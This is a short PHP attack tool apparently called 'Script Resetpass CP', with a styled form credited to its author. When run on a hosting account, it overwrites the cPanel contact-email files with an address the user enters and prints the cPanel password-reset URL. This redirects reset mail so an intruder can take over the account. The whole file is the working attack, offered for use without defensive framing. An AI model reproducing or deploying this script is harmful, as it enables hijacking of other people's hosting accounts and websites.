<?php
############################
##Script Resetpass CP 2017##
##Coded By Moneer Masoud  ##
############################
echo '<html>
    <head> 
	      <title>Script Resetpass CP  </title>
	      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		  <style>
		      body {
	          color:#80D713;
	          background-color:#000000;
	          }
			  h2{
			  color:#80D713;
			  }
		  </style>
      	</head>
     <body>
	 <!--SCC -->
       <center> 	 
	   <div style="border-radius: 10px;border: 1px solid #45BD00;padding: 4px 2px;width: 25%;line-height: 24px;background: #000;color:#fff;">
    <p><h2>Script Resetpass CP</h2></p>
	 <p><h2>Coded By Moneer Masoud</h2></p>
	<p>   
	    <form action="#" method="post">
	<input type="email" name="email" style="background-color: #181818;font: 9pt tahoma;color:#80D713;" />
	<input type="submit" name="submit" value="Send" style="background-color: #181818;font: 9pt tahoma;color:#80D713;"/>
	</form>
	<br /><br /><br />
	</p>
	</div>
   </center>
    </body>
</html>';

$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'w');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2083/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
}

?>
